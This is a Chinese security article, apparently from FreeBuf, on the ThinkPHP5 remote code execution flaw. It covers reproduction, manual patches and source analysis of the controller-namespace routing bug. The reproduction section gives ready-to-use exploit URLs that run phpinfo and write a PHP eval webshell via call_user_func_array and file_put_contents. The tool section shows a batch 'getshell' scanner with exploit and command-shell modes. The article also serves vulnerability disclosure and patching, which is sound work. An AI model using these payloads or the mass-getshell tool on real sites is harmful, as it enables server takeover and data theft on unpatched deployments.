***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、概述

**近日，thinkphp发布了安全更新，修复一个可getshell的rce漏洞，由于没有有效过滤$controller，导致攻击者可以利用命名空间的方式调用任意类的方法，进而getshell。**

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649234_5c117a12059ed.png!small)

## 二、影响范围

> 5.x < 5.1.31
>
> 5.x < 5.0.23

以及基于ThinkPHP5 二次开发的cms，如AdminLTE后台管理系统、thinkcmf、ThinkSNS等

shadon一下：

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544679657_5c11f0e971f54.png!small)

## 三、漏洞重现

###  **win7+thinkphp5.1.24**

 **（1）执行phpinfo**

/index.php/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649271_5c117a37db0d3.png!small)

 **（2）写一句话木马**

/index.php/?s=index/\think\template\driver\file/write&cacheFile=zxc0.php&content=<?php
@eval($_POST[xxxxxx]);?>’

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649299_5c117a5321a17.png!small)

###  **debian+thinkphp5.1.30**

 **（1）执行phpinfo**

/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

![tp5rce040.png](https://image.3001.net/images/20181213/1544649324_5c117a6c9b89f.png!small)

 **（2）写一句话木马**

/index.php/?s=index/\think\template\driver\file/write&cacheFile=zxc0.php&content=<?php
@eval($_POST[xxxxxx]);?>

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649344_5c117a80668aa.png!small)

###  **win7+thinkphp5.0.16**

 **（1）执行phpinfo**

/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649374_5c117a9ea54f4.png!small)

 **（2）写一句话木马**

/index.php/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php
@eval($_POST[xxxxxx]);?>

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649398_5c117ab67a64b.png!small)

## 四、修复方案

> 1\. 直接git/composer更新
>
> 2\. 手工修复

 **5.1版本**

在think\route\dispatch\Url类的parseUrl方法，解析控制器后加上

    
    
    if ($controller && !preg_match(‘/^[A-Za-z](\w|\.)*$/’, $controller)) {
    
    throw new HttpException(404, ‘controller not exists:’ . $controller);}

 **5.0版本**

在think\App类的module方法的获取控制器的代码后面加上

    
    
    if (!preg_match(‘/^[A-Za-z](\w|\.)*$/’, $controller)) {
    
    throw new HttpException(404, ‘controller not exists:’ . $controller);}

如果改完后404，尝试修改正则，加上\/

    
    
     if (!preg_match(‘/^[A-Za-z\/](\w|\.)*$/’, $controller)) {

## 五、漏洞分析  

 **Thinkphp5.1.24**

先看补丁：

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649434_5c117adadb67b.png!small)

对controller添加了过滤

查看路由调度：  
Module.php:83

    
    
    public function exec()
        {
            // 监听module_init
            $this->app['hook']->listen('module_init');
     
            try {
                // 实例化控制器
                $instance = $this->app->controller($this->controller,
                    $this->rule->getConfig('url_controller_layer'),
                    $this->rule->getConfig('controller_suffix'),
                    $this->rule->getConfig('empty_controller'));
            } catch (ClassNotFoundException $e) {
                throw new HttpException(404, 'controller not exists:' . $e->getClass());
            }
    ......
                $data = $this->app->invokeReflectMethod($instance, $reflect, $vars);
     
                return $this->autoResponse($data);
            });
    

$instance = $this->app->controller

实例化控制器以调用其中的方法

查看controller方法

App.php:719

    
    
     public function controller($name, $layer = 'controller', $appendSuffix = false, $empty = '')
        {
            list($module, $class) = $this->parseModuleAndClass($name, $layer, $appendSuffix);
     
            if (class_exists($class)) {
                return $this->__get($class);
            } elseif ($empty && class_exists($emptyClass = $this->parseClass($module, $layer, $empty, $appendSuffix))) {
                return $this->__get($emptyClass);
            }
     
            throw new ClassNotFoundException('class not exists:' . $class, $class);
    }

list($module, $class) = $this->parseModuleAndClass($name, $layer,
$appendSuffix);

parseModuleAndClass解析$name为模块和类，再实例化类

查看该方法，第640行

    
    
    protected function parseModuleAndClass($name, $layer, $appendSuffix)
        {
            if (false !== strpos($name, '\\')) {
                $class  = $name;
                $module = $this->request->module();
            } else {
                if (strpos($name, '/')) {
                    list($module, $name) = explode('/', $name, 2);
                } else {
                    $module = $this->request->module();
                }
     
                $class = $this->parseClass($module, $layer, $name, $appendSuffix);
            }
     
            return [$module, $class];
    }

可以看出如果$name包含了\，就

    
    
    $class  = $name;
    
    $module = $this->request->module();
    
    ……
    
    return [$module, $class];

 **直接将$name作为类名了，而命名空间就含有\，所以可以利用命名空间来实例化任意类**

现在看看如何控制$name，即$controller。

查看路由解析，即如何解析url的

Url.php:37

    
    
        protected function parseUrl($url)
        {
            $depr = $this->rule->getConfig('pathinfo_depr');
            $bind = $this->rule->getRouter()->getBind();
     
            if (!empty($bind) && preg_match('/^[a-z]/is', $bind)) {
                $bind = str_replace('/', $depr, $bind);
                // 如果有模块/控制器绑定
                $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
            }
     
            list($path, $var) = $this->rule->parseUrlPath($url);
            if (empty($path)) {
                return [null, null, null];
            }

list($path, $var) = $this->rule->parseUrlPath($url);

调用了parseUrlPath()，继续跟进

查看Rule.php:947

    
    
    public function parseUrlPath($url)
        {
            // 分隔符替换 确保路由定义使用统一的分隔符
            $url = str_replace('|', '/', $url);
            $url = trim($url, '/');
            $var = [];
     
            if (false !== strpos($url, '?')) {
                // [模块/控制器/操作?]参数1=值1&参数2=值2...
                $info = parse_url($url);
                $path = explode('/', $info['path']);
                parse_str($info['query'], $var);
            } elseif (strpos($url, '/')) {
                // [模块/控制器/操作]
                $path = explode('/', $url);
            } elseif (false !== strpos($url, '=')) {
                // 参数1=值1&参数2=值2...
                $path = [];
                parse_str($url, $var);
            } else {
                $path = [$url];
            }
     
            return [$path, $var];
    }

用/分割url获取每一部分的信息，未过滤

看看如何获取url:  
Request.php:716

    
    
    /**
         * 获取当前请求URL的pathinfo信息(不含URL后缀)
         * @access public
         * @return string
         */
        public function path()
        {
            if (is_null($this->path)) {
                $suffix   = $this->config['url_html_suffix'];
                $pathinfo = $this->pathinfo();
     
                if (false === $suffix) {
                    // 禁止伪静态访问
                    $this->path = $pathinfo;
                } elseif ($suffix) {
                    // 去除正常的URL后缀
                    $this->path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
                } else {
                    // 允许任何后缀访问
                    $this->path = preg_replace('/\.' . $this->ext() . '$/i', '', $pathinfo);
                }
            }
     
            return $this->path;
    }

注意在该文件第31行

// PATHINFO变量名 用于兼容模式

‘var_pathinfo’ => ‘s’,

所以可以用pathinfo或s来传路由

//windows会将pathinfo的\替换成/，建议用s

综上可构造payload如：  
[http://127.0.0.1/public/index.php?s=index/namespace\class/method](http://127.0.0.1/public/index.php?s=index/namespace/class/method)

接着分析一个写shell的exp

<http://127.0.0.1/public/index.php/?s=index/>\think\template\driver\file/write&cacheFile=zxc0.php&content=<?php
@eval($_POST[xxxxxx]);?>

调用了\think\template\driver\file这个类

    
    
    class File
    {
        protected $cacheFile;
     
        /**
         * 写入编译缓存
         * @access public
         * @param  string $cacheFile 缓存的文件名
         * @param  string $content 缓存的内容
         * @return void|array
         */
        public function write($cacheFile, $content)
        {
            // 检测模板目录
            $dir = dirname($cacheFile);
     
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
     
            // 生成模板缓存文件
            if (false === file_put_contents($cacheFile, $content)) {
                throw new Exception('cache write error:' . $cacheFile, 11602);
            }
    }

就这样直接写入shell了

## 六、 检测工具

项目地址：<https://github.com/theLSA/tp5-getshell>

本工具支持单url/批量检测，有phpinfo模式、cmd shell模式、getshell(写一句话)模式，批量检测直接使用getshell模式。  

使用帮助

python tp5-getshell.py -h

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649686_5c117bd678801.png!small)

单url检测（phpinfo模式）

使用4种poc检测：查看phpinfo

python tp5-getshell.py -u _<http://www.xxx.com:8888/think5124/public/>_

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649712_5c117bf04b693.png!small)

单url检测（getshell模式）

使用3种exp进行getshell，遇到先成功的exp就停止，防止重复getshell

python tp5-getshell.py -u <http://www.xxx.com:8888/think5124/public/>
–exploit![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649733_5c117c056cf38.png!small)

单url检测（cmd shell模式）

python tp5-getshell.py -u <http://www.xxx.com/> –cmdshell

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649759_5c117c1f9cc62.png!small)

批量检测（getshell模式）

使用3种exp进行getshell，遇到先成功的exp就停止，防止重复getshell

python tp5-getshell.py -f urls.txt -t 2 -s 10

![ThinkPHP5
RCE漏洞重现及分析](https://image.3001.net/images/20181213/1544649783_5c117c37576b2.png!small)

## 七、参考资料

> [ _https://xz.aliyun.com/t/3570_](https://xz.aliyun.com/t/3570)
>
> [
> _https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ_](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)
>
> [ _https://blog.thinkphp.cn/869075_](https://blog.thinkphp.cn/869075)
>
> <https://iaq.pw/archives/106>
>
>  _<https://github.com/top-> think/framework/commit/802f284bec821a608e7543d91126abc5901b2815>_

 ***本文作者：LSA，转载请注明来自 FreeBuf.COM**

